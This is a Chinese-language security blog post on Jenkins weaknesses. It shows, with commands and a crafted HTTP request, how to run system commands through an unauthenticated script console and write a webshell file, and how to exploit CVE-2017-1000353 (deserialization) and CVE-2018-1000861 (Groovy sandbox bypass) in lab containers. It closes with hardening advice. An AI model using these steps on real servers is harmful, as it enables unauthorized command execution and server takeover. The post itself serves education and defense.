# Jenkins一些安全问题



#### 漏洞简介及危害
默认情况下 Jenkins面面板中用户可以选择执行脚本界面来操作一些系统层命令,攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务,通过脚本执行行界面从而获取服务器权限。


#### 环境搭建
```bash
# 下载地址： https://www.jenkins.io/download/
# 可以直接下载war包
java -jar jenkins.war    # 运行
# 
wget http://mirrors.jenkins.io/debian/jenkins_1.621_all.deb # 下载
dpkg -i jenkins_1.621_all.deb # 安装
sudo apt-get -f --fix-missing install # 如果有报依赖项的错误时执行行行
service jenkinis start    # 开启Jenkins服务

浏览器器访问http://192.168.0.100:8080/
```


#### 未授权访问测试
访问`http://192.168.0.100:8080/manage`可以看到没有任何限制可以直接访问


#### Jenkins未授权访问写shell
1.点击“脚本命令行”
![](http://image.xpshuai.cn/Jenkins_consele.png)

2.执行系统命令
```bash
println "whoami".execute().text
```
 3.利用“脚本命令行”写webshell,(`需要一定的权限且知道网站绝对路径`)，点击运行,写入成功
```bash
new File ("/var/www/html/shell.php").write('<?php phpinfo(); ?>');
```
![](http://image.xpshuai.cn/Jenkins_cmd.png)

4.访问shell.php， 测试成功
![](http://image.xpshuai.cn/Jenkins_shell.png)



####  CVE-2017-1000353
>这是一个java反序列化漏洞

执行如下命令启动jenkins 2.46.1：
```bash
docker-compose up -d
```
等待完全启动成功后，访问`http://your-ip:8080`即可看到jenkins已成功运行，无需手工安装。

###### 原理
参考：   https://blogs.securiteam.com/index.php/archives/3171

###### 测试
1.生成序列化字符串
```bash
# 参考 https://github.com/vulhub/CVE-2017-1000353
# 首先下载POC生成工具：   https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar

# 执行下面命令，生成字节码文件
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touc /tmp/success" 
# jenkins_poc.ser是生成的字节码文件名
# "touch ..."是待执行的任意命令
# 生成jenkins_poc.ser文件，这就是序列化字符串。
```

2.生成jenkins_poc.ser文件，这就是序列化字符串。
```bash
# 下载 https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py
# Python3执行
python3 exploit.py http://192.168.0.100:8080 jenkins_poc.ser    # 将刚才生成的字节码文件发送给目标
```

3.进入docker容器发现文件创建成功


#### CVE-2018-1000861
Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。
通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。


###### 测试
执行如下命令启动一个Jenkins 2.138，包含漏洞的插件也已经安装：
```bash
docker-compose up -d
```

使用 @orangetw 给出的[一键化POC脚本](https://github.com/orangetw/awesome-jenkins-rce-2019)，发送如下请求即可成功执行命令：
```bash
http://192.168.0.100:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
?sandbox=true
&value=public class x {
  public x(){
    "touch /tmp/success".execute()
  }
}

# 请求替换到burp拦截的数据包中
```
数据包如下
```
GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20{public%20x(){%22touch%20/tmp/CVE-2018-1000861_is_success%22.execute()}} HTTP/1.1
Host: 192.168.0.100:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID.a3c40b9a=node010r4vkf3cix27hr5qd9qvw5y41.node0; screenResolution=1920x1080
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

进入容器: `docker-compose exec jenkins bash`,看到 /tmp/success文件创建成功
![](http://image.xpshuai.cn/Jenkins_poc_ok.png)



#### 配置方面的安全问题
1.允许任意账户注册 带来的安全问题
![](http://image.xpshuai.cn/Jenkins_reg_any.png)
关闭用户注册
![](http://image.xpshuai.cn/Jenkins_reg.png)

2.允许匿名访问带来的问题
建议关闭
![](http://image.xpshuai.cn/Jenkins_nologin.png)




jenkins的日志功能不是很好（可以使用代理，并进行操作的记录）


#### 安全建议
- 使用最新版的jenkins
- 关闭匿名访问
- 关闭用户注册功能
- 用户严格授权
- 最小化插件，相关插件使用最新版
- 使用nginx代理jenkins，不要直接暴露在公网




参考：https://www.secpulse.com/archives/2166.html




---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/jenkins%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/  

